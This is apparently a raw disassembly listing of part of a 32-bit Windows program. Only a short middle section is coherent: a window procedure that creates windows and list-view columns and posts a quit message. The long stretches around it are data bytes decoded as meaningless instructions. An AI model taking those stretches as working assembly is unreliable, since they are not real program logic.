  41f79d:	inc    ecx
  41f79e:	inc    eax
  41f79f:	int3   
  41f7a0:	inc    ecx
  41f7a1:	aad    0x7
  41f7a3:	dec    eax
  41f7a4:	inc    edx
  41f7a5:	leave  
  41f7a6:	ror    BYTE PTR [esi],1
  41f7a8:	mov    cl,0xbf
  41f7aa:	xor    BYTE PTR [ecx],0xa3
  41f7ad:	mov    ah,BYTE PTR [edx-0x19]
  41f7b0:	(bad)  
  41f7b1:	jmp    0x6c1ad618
  41f7b6:	int    0x2e
  41f7b8:	inc    edx
  41f7b9:	xor    al,0xbf
  41f7bb:	test   al,0xb4
  41f7bd:	push   eax
  41f7be:	ret    0xb030
  41f7c1:	aaa    
  41f7c2:	mov    edi,0xa1aaa311
  41f7c7:	inc    ebx
  41f7c8:	pusha  
  41f7c9:	inc    edx
  41f7ca:	adc    BYTE PTR [edx+0x40],ah
  41f7cd:	inc    ecx
  41f7ce:	and    eax,0x40000500
  41f7d3:	inc    ebx
  41f7d4:	add    eax,0x40624041
  41f7d9:	inc    ebx
  41f7da:	add    eax,0x43402541
  41f7df:	bound  eax,QWORD PTR [eax+0x43]
  41f7e2:	int3   
  41f7e3:	inc    eax
  41f7e4:	bound  eax,QWORD PTR [eax]
  41f7e6:	inc    ecx
  41f7e7:	inc    eax
  41f7e8:	inc    eax
  41f7e9:	add    eax,0x39a4bd05
  41f7ee:	and    DWORD PTR [ebp-0x45],0xd545076
  41f7f5:	dec    edi
  41f7f6:	push   esp
  41f7f7:	(bad)  
  41f7f8:	out    0x17,eax
  41f7fa:	or     ch,al
  41f7fc:	inc    edx
  41f7fd:	mov    eax,0x7845d015
  41f802:	outs   dx,DWORD PTR ds:[esi]
  41f803:	xchg   ecx,eax
  41f805:	adc    eax,0xb55262cb
  41f80a:	adc    eax,0x50cbfc79
  41f80f:	(bad)
  41f812:	outs   dx,DWORD PTR ds:[esi]
  41f813:	bound  eax,QWORD PTR [eax+0x25]
  41f816:	add    BYTE PTR [esi+0x40],ah
  41f819:	add    eax,0x40404143
  41f81e:	inc    ebx
  41f81f:	add    BYTE PTR [eax],al
  41f821:	add    BYTE PTR [edx-0x34],ah
  41f824:	inc    eax
  41f825:	add    eax,0x40004041
  41f82a:	inc    ecx
  41f82b:	int3   
  41f82c:	add    BYTE PTR [ebx-0x7c],al
  41f82f:	add    eax,0x5406240
  41f834:	bound  esi,QWORD PTR [edx+eax*2]
  41f837:	or     al,0xa9
  41f839:	pop    ecx
  41f83a:	push   esi
  41f83b:	rcr    BYTE PTR [edi],cl
  41f83d:	and    BYTE PTR [ecx],0x34
  41f840:	sub    ebp,0xc56f362e
  41f846:	leave  
  41f847:	mov    DWORD PTR [eax+0x1f40204d],ebp
  41f84d:	inc    edi
  41f84e:	inc    edx
  41f84f:	lds    ecx,FWORD PTR ds:0x6240802c
  41f855:	pop    eax
  41f856:	inc    ecx
  41f857:	add    eax,0x40404340
  41f85c:	inc    ebx
  41f85d:	inc    eax
  41f85e:	test   BYTE PTR [eax],al
  41f860:	add    eax,0x40624041
  41f865:	inc    eax
  41f866:	add    BYTE PTR [edx+0x5],ah
  41f869:	inc    ebx
  41f86a:	add    BYTE PTR [eax+0x78],al
  41f86d:	inc    ecx
  41f86e:	add    BYTE PTR [eax+0x41],bl
  41f871:	bound  esi,QWORD PTR [ecx]
  41f873:	bound  bp,DWORD PTR [edx]
  41f876:	inc    ebp
  41f877:	imul   esi,DWORD PTR [ebx+edx*4],0xffffffe8
  41f87b:	lahf   
  41f87c:	adc    BYTE PTR [esi+0x14],al
  41f87f:	mov    ah,0xd5
  41f881:	inc    ecx
  41f882:	mov    ecx,0x14de63ef
  41f887:	or     eax,0x66fb137d
  41f88c:	sub    eax,0xfacb6278
  41f891:	and    al,0x74
  41f893:	sbb    eax,DWORD PTR [esi-0x54]
  41f896:	stc    
  41f897:	push   edx
  41f898:	cmp    edi,esi
  41f89a:	push   ecx
  41f89b:	data16 test al,0x31
  41f89e:	jnp    0x41f8e0
  41f8a0:	xchg   esp,eax
  41f8a1:	sub    al,0x4e
  41f8a3:	pop    ds
  41f8a4:	inc    ecx
  41f8a5:	dec    eax
  41f8a6:	loope  0x41f8e8
  41f8a8:	test   BYTE PTR [eax],al
  41f8aa:	int3   
  41f8ab:	bound  eax,QWORD PTR ds:0xcc840f41
  41f8b1:	inc    ebx
  41f8b2:	add    BYTE PTR [eax+0x0],al
  41f8b5:	inc    eax
  41f8b6:	inc    eax
  41f8b7:	inc    eax
  41f8b8:	int3   
  41f8b9:	add    BYTE PTR ds:0x62404341,al
  41f8bf:	pop    eax
  41f8c0:	add    BYTE PTR [ebx+0x40],al
  41f8c3:	bound  ecx,QWORD PTR [edi]
  41f8c5:	inc    eax
  41f8c6:	inc    ecx
  41f8c7:	arpl   WORD PTR [esi-0x70],sp
  41f8ca:	or     DWORD PTR [edx],ebp
  41f8cc:	bound  esp,QWORD PTR [ebp-0x4c]
  41f8cf:	int    0x3e
  41f8d1:	sub    al,0x9d
  41f8d3:	adc    ebp,ebx
  41f8d5:	mov    ah,0x6d
  41f8d7:	jge    0x41f8a3
  41f8d9:	dec    edi
  41f8da:	inc    esi
  41f8db:	inc    ebx
  41f8dc:	arpl   WORD PTR ds:0x5f43ed40,ax
  41f8e2:	push   ebp
  41f8e3:	sub    cl,dl
  41f8e5:	leave  
  41f8e6:	inc    eax
  41f8e7:	stc    
  41f8e8:	push   ebp
  41f8e9:	add    eax,DWORD PTR [eax]
  41f8eb:	add    BYTE PTR [eax+0x40],al
  41f8ee:	cmovno eax,DWORD PTR ds:0x40056243
  41f8f5:	int3   
  41f8f6:	add    ah,cl
  41f8f8:	inc    eax
  41f8f9:	inc    eax
  41f8fa:	bound  eax,QWORD PTR [ecx+0x0]
  41f8fd:	add    BYTE PTR [edi],cl
  41f8ff:	inc    ebx
  41f900:	inc    eax
  41f901:	inc    eax
  41f902:	add    BYTE PTR [ecx+0x43],al
  41f905:	add    eax,0x40256240
  41f90a:	bound  eax,QWORD PTR [eax]
  41f90c:	push   es
  41f90d:	xor    al,0xa8
  41f90f:	mov    al,0xc0
  41f911:	cmp    DWORD PTR [edx-0x20322a4f],ebx
  41f917:	inc    ecx
  41f918:	inc    eax
  41f919:	mov    DWORD PTR [esi+0x2acd5a46],ebp
  41f91f:	bound  eax,QWORD PTR [ecx+0x51f14863]
  41f925:	inc    eax
  41f926:	fs enter 0x4bc1,0xc5
  41f92b:	dec    edi
  41f92c:	inc    esp
  41f92d:	inc    edx
  41f92e:	test   al,0x52
  41f930:	inc    ebx
  41f931:	cld    
  41f932:	dec    edi
  41f933:	pop    ecx
  41f934:	jno    0x41f976
  41f936:	bound  esi,QWORD PTR [ebp+0x4f]
  41f939:	cmp    DWORD PTR [eax+0x40467e4f],eax
  41f93f:	sbb    al,ch
  41f941:	mov    BYTE PTR [esi],ch
  41f943:	pop    edi
  41f944:	xor    eax,0x5524028
  41f949:	add    ah,cl
  41f94b:	inc    eax
  41f94c:	inc    ecx
  41f94d:	inc    eax
  41f94e:	inc    ebx
  41f94f:	bound  esp,QWORD PTR ds:0x41400043
  41f955:	add    BYTE PTR [eax],al
  41f957:	add    eax,0x43624062
  41f95c:	inc    ecx
  41f95d:	inc    eax
  41f95e:	inc    eax
  41f95f:	inc    eax
  41f960:	add    eax,0x40624340
  41f965:	add    eax,0x40664140
  41f96a:	push   esp
  41f96b:	fs test eax,0x4310bf9f
  41f971:	sub    BYTE PTR ds:0x504f2350,al
  41f977:	inc    ebp
  41f978:	adc    BYTE PTR ds:0x5fd2ec43,dh
  41f97e:	sbb    DWORD PTR [ecx-0x3c],eax
  41f981:	xchg   ecx,eax
  41f982:	mov    ah,0x39
  41f984:	add    BYTE PTR [esi+0x5c],dh
  41f987:	les    ecx,FWORD PTR [edi+0x7b]
  41f98a:	add    eax,0xd0770488
  41f98f:	int    0x40
  41f991:	dec    eax
  41f992:	retf   
  41f993:	rcl    BYTE PTR fs:[eax+0x2c],cl
  41f997:	outs   dx,DWORD PTR ds:[esi]
  41f998:	inc    esp
  41f999:	(bad)  
  41f99a:	mov    ah,0x5d
  41f99c:	fidivr DWORD PTR [edi+0x43]
  41f99f:	leave  
  41f9a0:	ds inc ebx
  41f9a2:	adc    eax,0x715820fc
  41f9a7:	inc    ebx
  41f9a8:	add    BYTE PTR ds:0x41107840,al
  41f9ae:	bound  eax,QWORD PTR [eax+0x40]
  41f9b1:	sldt   WORD PTR [eax-0x34]
  41f9b5:	js     0x41fa19
  41f9b7:	add    eax,0x40664143
  41f9bc:	inc    ebx
  41f9bd:	add    BYTE PTR [ecx+0x5],al
  41f9c0:	js     0x41fa02
  41f9c2:	bound  eax,QWORD PTR [eax+0x0]
  41f9c5:	inc    eax
  41f9c6:	bound  ebx,QWORD PTR [ebp+ecx*2-0xcb1c637]
  41f9cd:	push   esp
  41f9ce:	fdiv   DWORD PTR ds:0xa688b4d8
  41f9d4:	pop    ecx
  41f9d5:	jne    0x41f96b
  41f9d7:	enter  0x1552,0x63
  41f9db:	fbstp  TBYTE PTR [ecx+0x4a]
  41f9de:	arpl   ax,cx
  41f9e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9e1:	inc    ebx
  41f9e2:	lds    edx,FWORD PTR [eax+eax*2]
  41f9e5:	pop    ss
  41f9e6:	std    
  41f9e7:	inc    ebx
  41f9e8:	clc    
  41f9e9:	push   ecx
  41f9ea:	dec    esi
  41f9eb:	adc    BYTE PTR [eax+0x0],0x58
  41f9ef:	sub    eax,0x1efdff3d
  41f9f4:	jns    0x41fa2a
  41f9f6:	bound  esp,QWORD PTR [ebx-0x55c6b055]
  41f9fc:	pop    eax
  41f9fd:	and    bh,BYTE PTR [esi+0x43414246]
  41fa03:	inc    eax
  41fa04:	inc    eax
  41fa05:	add    eax,0x434162
  41fa0a:	inc    eax
  41fa0b:	add    BYTE PTR [edx+0x5],ah
  41fa0e:	inc    eax
  41fa0f:	adc    BYTE PTR [edx+0x40],ah
  41fa12:	inc    ebx
  41fa13:	inc    ecx
  41fa14:	add    eax,0x4340
  41fa19:	add    eax,0x404162
  41fa1e:	add    BYTE PTR [eax+0x43],al
  41fa21:	inc    eax
  41fa22:	add    eax,0x71268850
  41fa27:	sahf   
  41fa28:	aad    0xd5
  41fa2a:	xor    eax,0xbdf8640d
  41fa2f:	inc    ebp
  41fa30:	xor    eax,DWORD PTR [ebx-0x80]
  41fa33:	retf   
  41fa34:	aaa    
  41fa35:	adc    ebx,DWORD PTR [eax-0x2f]
  41fa38:	cli    
  41fa39:	fadd   st(5),st
  41fa3b:	dec    esp
  41fa3c:	je     0x41f9fe
  41fa3e:	sti    
  41fa3f:	jns    0x41faa3
  41fa41:	xor    BYTE PTR [edx+0x41],al
  41fa44:	mov    eax,fs:0xc4bf112c
  41fa4a:	inc    BYTE PTR [eax+0x39]
  41fa4d:	ins    DWORD PTR es:[edi],dx
  41fa4e:	xchg   ecx,eax
  41fa4f:	dec    edi
  41fa50:	mov    edi,0x41000040
  41fa55:	inc    ebx
  41fa56:	add    eax,0x41784062
  41fa5b:	inc    eax
  41fa5c:	inc    eax
  41fa5d:	add    BYTE PTR [edi],cl
  41fa5f:	bound  eax,QWORD PTR [ebx+0x0]
  41fa62:	add    eax,0x25006240
  41fa67:	inc    eax
  41fa68:	add    eax,0x40254143
  41fa6d:	add    eax,0x4f620000
  41fa72:	dec    edi
  41fa73:	or     eax,0x315c1588
  41fa78:	mov    esi,0x63c4b044
  41fa7d:	bound  esi,QWORD PTR [eax]
  41fa7f:	add    BYTE PTR [edi+ebp*4+0x3ccd6315],bh
  41fa86:	sub    al,0x93
  41fa88:	inc    ecx
  41fa89:	addr16 dec eax
  41fa8b:	imul   eax,eax,0x65462c68
  41fa91:	sbb    esp,ebp
  41fa93:	sbb    cl,ah
  41fa95:	add    eax,0x24e05752
  41fa9a:	in     al,0x62
  41fa9c:	fs scas eax,DWORD PTR es:[edi]
  41fa9e:	jp     0x41fae1
  41faa0:	popaw  
  41faa2:	inc    ebp
  41faa3:	add    DWORD PTR [ecx],edi
  41faa5:	inc    ebx
  41faa6:	add    BYTE PTR [eax],al
  41faa8:	add    BYTE PTR [ecx+0x40],al
  41faab:	bound  esp,QWORD PTR [esi+0x0]
  41faae:	inc    eax
  41faaf:	add    eax,0x5400000
  41fab4:	inc    ecx
  41fab5:	inc    eax
  41fab6:	inc    eax
  41fab7:	bound  esp,QWORD PTR ds:0x25050043
  41fabd:	inc    ecx
  41fabe:	inc    ebx
  41fabf:	inc    eax
  41fac0:	test   BYTE PTR [eax+0x0],al
  41fac3:	bound  ebx,QWORD PTR [eax+0x62]
  41fac6:	inc    ecx
  41fac7:	inc    eax
  41fac8:	push   eax
  41fac9:	push   es
  41faca:	jne    0x41fadc
  41facc:	mov    edi,0x6e88c035
  41fad1:	push   ecx
  41fad2:	push   0x6389a86c
  41fad7:	fs nop
  41fad9:	je     0x41faac
  41fadb:	push   edx
  41fadc:	adc    ebp,eax
  41fade:	push   eax
  41fadf:	dec    esi
  41fae0:	inc    edx
  41fae1:	xchg   ecx,eax
  41fae2:	sub    al,0x5f
  41fae4:	test   al,0x41
  41fae6:	adc    eax,0xb1ab25fc
  41faeb:	mov    al,ds:0x51cba50d
  41faf0:	jl     0x41fb33
  41faf2:	mov    edi,0xa834cb10
  41faf7:	cmp    al,0xc7
  41faf9:	push   eax
  41fafa:	popa   
  41fafb:	ins    BYTE PTR es:[edi],dx
  41fafc:	inc    eax
  41fafd:	loope  0x41fb0c
  41faff:	and    dl,BYTE PTR [eax]
  41fb01:	bound  eax,QWORD PTR [eax+0x41]
  41fb04:	and    eax,0x40000500
  41fb09:	inc    ebx
  41fb0a:	add    eax,0x40624041
  41fb0f:	inc    ebx
  41fb10:	add    eax,0x43402541
  41fb15:	bound  eax,QWORD PTR [eax+0x43]
  41fb18:	int3   
  41fb19:	inc    eax
  41fb1a:	bound  eax,QWORD PTR [eax]
  41fb1c:	inc    ecx
  41fb1d:	inc    eax
  41fb1e:	inc    eax
  41fb1f:	add    eax,0x9137ae05
  41fb24:	push   edx
  41fb25:	inc    ebp
  41fb26:	sub    cl,cl
  41fb28:	aad    0x4a
  41fb2a:	sub    al,0x79
  41fb2c:	push   0x7a435c3c
  41fb31:	or     bl,ch
  41fb33:	cmc    
  41fb34:	mov    al,ds:0xee4115b0
  41fb39:	push   edx
  41fb3a:	push   esi
  41fb3b:	inc    edx
  41fb3c:	adc    al,dl
  41fb3e:	sbb    al,0x74
  41fb40:	cmp    DWORD PTR [eax+0xa6cd53f],ebx
  41fb46:	cmp    eax,0x4f43886d
  41fb4b:	cs push edx
  41fb4d:	popa   
  41fb4e:	fimul  WORD PTR [esp+eiz*2+0x5]
  41fb52:	xchg   esp,eax
  41fb53:	mov    cl,0xcd
  41fb55:	(bad)  
  41fb56:	les    ecx,FWORD PTR ds:0x4062654e
  41fb5c:	and    eax,0x5406600
  41fb61:	inc    ebx
  41fb62:	inc    ecx
  41fb63:	inc    eax
  41fb64:	inc    eax
  41fb65:	inc    ebx
  41fb66:	add    BYTE PTR [eax],al
  41fb68:	add    ah,cl
  41fb6a:	int3   
  41fb6b:	int3   
  41fb6c:	int3   
  41fb6d:	int3   
  41fb6e:	int3   
  41fb6f:	int3   
  41fb70:	push   ebp
  41fb71:	mov    ebp,esp
  41fb73:	sub    esp,0x90
  41fb79:	mov    eax,DWORD PTR [ebp+0xc]
  41fb7c:	mov    DWORD PTR [ebp-0x8c],eax
  41fb82:	cmp    DWORD PTR [ebp-0x8c],0x1
  41fb89:	je     0x41fbad
  41fb8b:	cmp    DWORD PTR [ebp-0x8c],0x2
  41fb92:	je     0x41fca0
  41fb98:	cmp    DWORD PTR [ebp-0x8c],0x111
  41fba2:	je     0x41fc53
  41fba8:	jmp    0x41fcae
  41fbad:	push   0x0
  41fbaf:	mov    ecx,DWORD PTR ds:0x427254
  41fbb5:	push   ecx
  41fbb6:	push   0x0
  41fbb8:	mov    edx,DWORD PTR [ebp+0x8]
  41fbbb:	push   edx
  41fbbc:	push   0x18
  41fbbe:	push   0x8c
  41fbc3:	push   0x65
  41fbc5:	push   0x69
  41fbc7:	push   0x40000000
  41fbcc:	push   0x422f28
  41fbd1:	push   0x422f2c
  41fbd6:	push   0x0
  41fbd8:	call   DWORD PTR ds:0x421060
  41fbde:	mov    ds:0x427258,eax
  41fbe3:	push   0x0
  41fbe5:	mov    eax,ds:0x427254
  41fbea:	push   eax
  41fbeb:	push   0x0
  41fbed:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbf0:	push   ecx
  41fbf1:	push   0x18
  41fbf3:	push   0x8c
  41fbf8:	push   0x28
  41fbfa:	push   0x64
  41fbfc:	push   0x40000000
  41fc01:	push   0x0
  41fc03:	push   0x422f34
  41fc08:	push   0x0
  41fc0a:	call   DWORD PTR ds:0x421060
  41fc10:	mov    ds:0x427250,eax
  41fc15:	mov    edx,DWORD PTR [ebp+0x8]
  41fc18:	push   edx
  41fc19:	call   0x41fcf0
  41fc1e:	add    esp,0x4
  41fc21:	mov    DWORD PTR [ebp-0x7c],0x2
  41fc28:	lea    eax,[ebp-0x7c]
  41fc2b:	push   eax
  41fc2c:	push   0x2
  41fc2e:	push   0x1019
  41fc33:	mov    ecx,DWORD PTR ds:0x427248
  41fc39:	push   ecx
  41fc3a:	call   DWORD PTR ds:0x421070
  41fc40:	mov    edx,DWORD PTR [ebp-0x74]
  41fc43:	add    edx,0x1
  41fc46:	mov    DWORD PTR ds:0x42724c,edx
  41fc4c:	or     eax,0xffffffff
  41fc4f:	jmp    0x41fcc4
  41fc51:	jmp    0x41fcc4
  41fc53:	mov    eax,DWORD PTR [ebp+0x10]
  41fc56:	and    eax,0xffff
  41fc5b:	movzx  ecx,ax
  41fc5e:	mov    DWORD PTR [ebp-0x80],ecx
  41fc61:	mov    edx,DWORD PTR [ebp+0x10]
  41fc64:	shr    edx,0x10
  41fc67:	and    edx,0xffff
  41fc6d:	movzx  eax,dx
  41fc70:	mov    DWORD PTR [ebp-0x84],eax
  41fc76:	mov    ecx,DWORD PTR [ebp-0x80]
  41fc79:	mov    DWORD PTR [ebp-0x90],ecx
  41fc7f:	cmp    DWORD PTR [ebp-0x90],0x69
  41fc86:	je     0x41fc8a
  41fc88:	jmp    0x41fc96
  41fc8a:	mov    edx,DWORD PTR [ebp+0x8]
  41fc8d:	push   edx
  41fc8e:	call   DWORD PTR ds:0x42106c
  41fc94:	jmp    0x41fc9a
  41fc96:	jmp    0x41fcae
  41fc98:	jmp    0x41fcae
  41fc9a:	xor    eax,eax
  41fc9c:	jmp    0x41fcc4
  41fc9e:	jmp    0x41fcc4
  41fca0:	push   0x0
  41fca2:	call   DWORD PTR ds:0x4210d4
  41fca8:	xor    eax,eax
  41fcaa:	jmp    0x41fcc4
  41fcac:	jmp    0x41fcc4
  41fcae:	mov    eax,DWORD PTR [ebp+0x14]
  41fcb1:	push   eax
  41fcb2:	mov    ecx,DWORD PTR [ebp+0x10]
  41fcb5:	push   ecx
  41fcb6:	mov    edx,DWORD PTR [ebp+0xc]
  41fcb9:	push   edx
  41fcba:	mov    eax,DWORD PTR [ebp+0x8]
  41fcbd:	push   eax
  41fcbe:	call   DWORD PTR ds:0x421064
  41fcc4:	mov    esp,ebp
  41fcc6:	pop    ebp
  41fcc7:	ret    0x10
  41fcca:	int3   
  41fccb:	int3   
  41fccc:	int3   
  41fccd:	int3   
  41fcce:	int3   
  41fccf:	int3   
  41fcd0:	push   esi
  41fcd1:	push   edi
  41fcd2:	push   ebx
  41fcd3:	push   eax
  41fcd4:	pop    ebx
  41fcd5:	mov    edx,ebx
  41fcd7:	push   ecx
  41fcd8:	call   0x4053a0
  41fcdd:	pop    ecx
  41fcde:	loop   0x41fcd7
  41fce0:	pop    ebx
  41fce1:	pop    edi
  41fce2:	pop    esi
  41fce3:	xor    eax,eax
  41fce5:	ret    
  41fce6:	int3   
  41fce7:	int3   
  41fce8:	int3   
  41fce9:	int3   
  41fcea:	int3   
  41fceb:	int3   
  41fcec:	int3   
  41fced:	int3   
  41fcee:	int3   
  41fcef:	int3   
  41fcf0:	push   ebp
  41fcf1:	mov    ebp,esp
  41fcf3:	sub    esp,0x30
  41fcf6:	push   0x0
  41fcf8:	mov    eax,ds:0x427254
  41fcfd:	push   eax
  41fcfe:	push   0x0
  41fd00:	mov    ecx,DWORD PTR [ebp+0x8]
  41fd03:	push   ecx
  41fd04:	push   0x17e
  41fd09:	push   0x8c
  41fd0e:	push   0xac
  41fd13:	push   0x74
  41fd15:	push   0x1
  41fd17:	push   0x422f3c
  41fd1c:	push   0x422f44
  41fd21:	push   0x10200
  41fd26:	call   DWORD PTR ds:0x421060
  41fd2c:	mov    ds:0x427248,eax
  41fd31:	mov    DWORD PTR [ebp-0x30],0x6
  41fd38:	mov    DWORD PTR [ebp-0x24],0x422f54
  41fd3f:	mov    edx,DWORD PTR ds:0x42725c
  41fd45:	sub    edx,0x70c
  41fd4b:	mov    DWORD PTR [ebp-0x28],edx
  41fd4e:	mov    DWORD PTR [ebp-0x4],0x0
  41fd55:	jmp    0x41fd60
  41fd57:	mov    eax,DWORD PTR [ebp-0x4]
  41fd5a:	add    eax,0x1
  41fd5d:	mov    DWORD PTR [ebp-0x4],eax
  41fd60:	cmp    DWORD PTR [ebp-0x4],0x9
  41fd64:	jge    0x41fd8b
  41fd66:	mov    ecx,DWORD PTR [ebp-0x28]
  41fd69:	sub    ecx,0x1
  41fd6c:	mov    DWORD PTR [ebp-0x28],ecx
  41fd6f:	lea    edx,[ebp-0x30]
  41fd72:	push   edx
  41fd73:	mov    eax,DWORD PTR [ebp-0x4]
  41fd76:	push   eax
  41fd77:	push   0x101b
  41fd7c:	mov    ecx,DWORD PTR ds:0x427248
  41fd82:	push   ecx
  41fd83:	call   DWORD PTR ds:0x421070
  41fd89:	jmp    0x41fd57
  41fd8b:	mov    esp,ebp
  41fd8d:	pop    ebp
  41fd8e:	ret    
  41fd8f:	int3   
  41fd90:	cmp    dh,BYTE PTR [eax]
  41fd92:	mov    eax,ds:0x69d65516
  41fd97:	fild   DWORD PTR [edi-0x2e]
  41fd9a:	push   esi
  41fd9b:	mov    WORD PTR [ebx-0x47c53a7a],ds
  41fda1:	ins    BYTE PTR es:[edi],dx
  41fda2:	jnp    0x41fd5f
  41fda4:	cmp    dh,BYTE PTR [eax]
  41fda6:	mov    eax,ds:0xbb6f5516
  41fdab:	dec    ebp
  41fdac:	xchg   ebp,eax
  41fdad:	mov    ecx,0x178c3fe6
  41fdb2:	cmp    dl,BYTE PTR [esi-0x74]
  41fdb5:	fwait
  41fdb6:	xchg   BYTE PTR [esi-0x6f958447],bl
  41fdbc:	aam    0x76
  41fdbe:	pop    edi
  41fdbf:	shl    BYTE PTR [edx+0x19],0xbf
  41fdc3:	or     ebp,DWORD PTR [ecx-0x32d05fda]
  41fdc9:	fwait
  41fdca:	shl    DWORD PTR [eax+0x141ee84e],0xd8
  41fdd1:	jnp    0x41fe27
  41fdd3:	lds    esp,FWORD PTR [eax+esi*1-0x5b]
  41fdd7:	sbb    bl,bl
  41fdd9:	inc    esi
  41fdda:	mov    ecx,0xe3f5fe33
  41fddf:	test   eax,0x1f428a09
  41fde4:	xlat   BYTE PTR ds:[ebx]
  41fde5:	push   esi
  41fde6:	xor    bh,dh
  41fde8:	jg     0x41fe11
  41fdea:	mov    ds:0x932bba1c,al
  41fdef:	cmp    ah,al
  41fdf1:	hlt    
  41fdf2:	in     eax,0xc5
  41fdf4:	ins    BYTE PTR es:[edi],dx
  41fdf5:	rcr    DWORD PTR [esi],1
  41fdf7:	bswap  esi
  41fdf9:	pop    ebx
  41fdfa:	pop    esp
  41fdfb:	icebp  
  41fdfc:	cmp    ah,BYTE PTR fs:[edx-0x2dcc47f4]
  41fe03:	add    ch,ah
  41fe05:	jmp    0xd49daefc
  41fe0a:	sub    cl,BYTE PTR [ecx]
  41fe0c:	ficomp WORD PTR [edi+0x30]
  41fe0f:	hlt    
  41fe10:	js     0x41fe4a
  41fe12:	mov    bh,0x19
  41fe14:	lea    ebp,[esi]
  41fe16:	mov    bh,0x21
  41fe18:	ret    
  41fe19:	std    
  41fe1a:	shr    BYTE PTR [esi+edx*2-0x3cc19323],0x53
  41fe22:	inc    esp
  41fe23:	icebp  
  41fe24:	cmp    dh,BYTE PTR fs:[ebp-0x2dcb57f4]
  41fe2b:	push   esp
  41fe2c:	pop    es
  41fe2d:	ja     0x41fe34
  41fe2f:	add    edx,ecx
  41fe31:	xor    DWORD PTR [ecx],esi
  41fe33:	(bad)  
  41fe34:	xor    BYTE PTR [edi+0x34],ch
  41fe37:	sub    dl,BYTE PTR [ecx+ebx*2+0x53]
  41fe3b:	test   eax,0x135b5daf
  41fe40:	je     0x41fe52
  41fe42:	int3   
  41fe43:	int    0xb3
  41fe45:	cmc    
  41fe46:	nop
  41fe47:	ret    0x3ab9
  41fe4a:	xor    BYTE PTR [ecx-0x136aa964],ah
  41fe50:	sbb    esi,DWORD PTR [edx]
  41fe52:	sub    ebx,DWORD PTR [edi]
  41fe54:	stc    
  41fe55:	ins    DWORD PTR es:[edi],dx
  41fe56:	ins    DWORD PTR es:[edi],dx
  41fe57:	jmp    0x41fec1
  41fe59:	jmp    0x41fe42
  41fe5b:	cmp    DWORD PTR [ebx+0x1ee3bb6a],ebp
  41fe61:	stos   BYTE PTR es:[edi],al
  41fe62:	push   es
  41fe63:	xor    edx,DWORD PTR [edx+0x2]
  41fe66:	cs gs dec esp
  41fe69:	adc    DWORD PTR [ebp+0x1978bf86],eax
  41fe6f:	sub    al,0xb1
  41fe72:	jb     0x41fe25
  41fe74:	inc    esi
  41fe75:	ficom  WORD PTR [ecx+eiz*2+0x135b9724]
  41fe7c:	je     0x41fe26
  41fe7e:	inc    esi
  41fe7f:	dec    edi
  41fe80:	cmp    ebx,edi
  41fe82:	jmp    0xbb0fcd42
  41fe87:	mov    ds:0x67a29de8,al
  41fe8c:	and    eax,0xdf42a68f
  41fe91:	fs repz xor eax,0x2b94edc5
  41fe98:	push   eax
  41fe99:	fnstenv [ebx-0xe]
  41fe9c:	jmp    0x9f2228a1
  41fea1:	mov    bh,0x39
  41fea3:	pop    DWORD PTR [edi]
  41fea5:	into   
  41fea6:	cmp    BYTE PTR [ebx+esi*1-0x48],0x6c
  41feab:	jnp    0x41fedd
  41fead:	cmp    BYTE PTR [eax-0x1d],ah
  41feb0:	push   esp
  41feb1:	pop    ss
  41feb2:	xchg   esp,eax
  41feb3:	and    BYTE PTR [esi+0xfba59b1],ch
  41feb9:	pop    edi
  41feba:	dec    esi
  41febb:	sub    eax,0x7b6cb83a
  41fec0:	jecxz  0x41ff2c
  41fec2:	xor    eax,0xd655132b
  41fec7:	loopne 0x41fe67
  41fec9:	xchg   edi,eax
  41feca:	mov    dl,BYTE PTR [ebx+0x26]
  41fecd:	cwde   
  41fece:	xchg   ch,al
  41fed0:	mov    bl,0xfd
  41fed2:	mov    al,ds:0xbb1aeef0
  41fed7:	jecxz  0x41ff03
  41fed9:	push   esi
  41feda:	push   es
  41fedb:	loop   0x41fe76
  41fedd:	pop    ss
  41fede:	pop    ebx
  41fedf:	adc    eax,DWORD PTR [ecx+esi*8-0x7e]
  41fee3:	lods   eax,DWORD PTR ds:[esi]
  41fee4:	cmp    ch,BYTE PTR [eax+0x7f307b6c]
  41feea:	xor    BYTE PTR [eax-0xa],ah
  41feed:	push   edi
  41feee:	pop    ebp
  41feef:	adc    al,0xdf
  41fef1:	inc    esp
  41fef2:	adc    eax,0xd65bbf06
  41fef7:	cmp    ch,BYTE PTR [edi-0x74]
  41fefa:	in     eax,0x3e
  41fefc:	inc    edi
  41fefd:	mov    bl,0x75
  41feff:	push   ebp
  41ff00:	adc    eax,0x232c5f92
  41ff05:	into   
  41ff06:	xchg   edi,eax
  41ff07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff08:	pop    es
  41ff09:	arpl   WORD PTR ds:0x31333290,cx
  41ff0f:	ja     0x41ff41
  41ff11:	cmp    DWORD PTR [ebp+0x5d0c6261],esi
  41ff17:	arpl   WORD PTR [ebx+0x71ec433],bx
  41ff1d:	imul   edx,edi,0xffffff92
  41ff20:	(bad)  
  41ff21:	dec    ebx
  41ff22:	enter  0xe224,0x39
  41ff26:	leave  
  41ff27:	jecxz  0x41ff7d
  41ff29:	pop    ss
  41ff2a:	xchg   esp,eax
  41ff2b:	sub    bl,BYTE PTR [eax+0x53bd9104]
  41ff31:	(bad)  
  41ff33:	fbstp  TBYTE PTR [ecx+0x430ee77f]
  41ff39:	ins    BYTE PTR es:[edi],dx
  41ff3a:	sbb    esp,DWORD PTR [edi-0x63]
  41ff3d:	popf   
  41ff3e:	pop    ebp
  41ff3f:	sub    al,0x2f
  41ff41:	int3   
  41ff42:	sub    dl,BYTE PTR [ebp+0x4d]
  41ff45:	adc    al,bl
  41ff47:	xor    esi,eax
  41ff49:	dec    ebx
  41ff4a:	enter  0x5024,0xe3
  41ff4e:	mov    ebx,0x2e209d66
  41ff53:	aas    
  41ff54:	lock sbb DWORD PTR [ecx-0x62],0x9272e607
  41ff5c:	imul   ebp,edx,0xc5ed2a3b
  41ff62:	gs jno 0x41ffb1
  41ff65:	push   cs
  41ff66:	mov    DWORD PTR [edx+0x23],ebp
  41ff69:	into   
  41ff6a:	scas   eax,DWORD PTR es:[edi]
  41ff6b:	mov    ds:0x4e3e70d3,al
  41ff70:	ja     0x41ff2e
  41ff72:	out    0x6,eax
  41ff74:	inc    edi
  41ff75:	ins    DWORD PTR es:[edi],dx
  41ff76:	popa   
  41ff77:	sub    ah,BYTE PTR [ebx-0x53]
  41ff7a:	aad    0x98
